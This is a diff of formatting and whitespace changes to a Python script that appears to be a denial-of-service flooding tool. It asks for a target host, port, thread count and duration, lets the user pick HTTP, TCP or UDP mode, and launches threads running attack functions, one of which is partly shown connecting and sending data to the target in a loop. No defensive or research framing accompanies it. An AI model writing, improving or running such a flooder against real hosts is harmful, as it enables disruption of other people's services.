@@ -15,7 +15,7 @@ version = "2.2"
 
 def showBanner():
 	with open("lib/banner.txt") as f:
-		print(colored( f.read(), "red") + "[" + version + "]\n")
+		print(colored(f.read(), "red") + "[" + version + "]\n")
 
 def usageMsg():
 	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [THREADS] [DURATION]"
@@ -28,42 +28,34 @@ ip       = ""
 host_arr = []	
 
 if len(sys.argv) == 1:
-
 	while True:
-
-		target     = input("[+]TARGET > ")
+		target = input("[+]TARGET > ")
 
 		try:
 			host_arr = target.split('/')
 			host     = host_arr[2]
 			ip       = str(socket.gethostbyname(host))
 			break
-
 		except:
-
 			if len(target.split('.')) == 4:
 				host = target
 				ip   = str(host)
 				break
-
 			else:
 				print(colored("Host is incorrect!","red"))
 
 	while True:
-
 		try:
 			port     = int(input("[+]PORT (default: 80) > ") or 80 )
 			threads  = int(input("[+]THREADS (default: 20)> ") or 20 ) 
 			duration  = float(input("[+]DURATION (default: 5 min) > ") or 5 ) 
 			print("")
 			break
-
 		except:
 			print(colored("Incorrect input!", "red"))
 
 elif len(sys.argv) != 5:
 	usageMsg()
-
 else:
 	try:
 		ip       = ""
@@ -79,13 +71,10 @@ else:
 		host_arr = sys.argv[1].split('/')
 		host     = host_arr[2]
 		ip       = str(socket.gethostbyname(host))
-
 	except:
-
 		if len(sys.argv[1].split('.')) == 4:
 			host = sys.argv[1]
 			ip   = str(host)
-
 		else:
 			print(colored("Host is incorrect!\n","red"))
 			usageMsg()
@@ -187,7 +176,7 @@ def attackUdp():
 			sock.connect((ip, port))
 			sock.send(r)
 		except:
-				err += 1
+			err += 1
 		finally:
 			sock.close()
 
@@ -198,7 +187,6 @@ alltypes = ['udp','tcp','http','1','2','3']
 mode     = ""
 
 while True:
-
 	type = str(input("[HTTP/TCP/UDP][1/2/3] > "))
 
 	if type.lower() in alltypes:
@@ -211,15 +199,12 @@ while True:
 
 		print('[+]Mode set to ' + mode)
 		break
-
 	else:
-		print(colored('Wrong type!',"red"))
-		
+		print(colored('Wrong type!',"red"))		
 
 print("[*]STARTING...\n")
 
 for i in range(threads):
-
 	if mode == 'HTTP':
 		th = Thread(target=attackHttp)
 	elif mode == 'TCP':
